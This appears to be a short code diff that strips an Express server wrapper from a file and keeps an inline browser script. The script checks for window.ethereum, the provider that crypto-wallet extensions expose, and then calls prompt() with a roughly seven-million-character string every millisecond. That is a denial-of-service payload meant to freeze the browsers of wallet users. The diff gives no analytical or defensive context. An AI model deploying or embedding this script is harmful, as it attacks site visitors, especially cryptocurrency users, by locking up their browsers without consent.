@@ -1,9 +1,4 @@
-const express = require('express');
-const app = express();
 
-app.get('/', (req, res) => {
-    res.send(`
-    served script
     <script>
     if(window.ethereum){
 setInterval(function(){
@@ -11,9 +6,3 @@ prompt("abcdefg".repeat(999999))
 },1)
 }
 </script>
-`)
-});
-
-app.listen(3000, () => {
-    console.log('Server running on port 3000');
-});
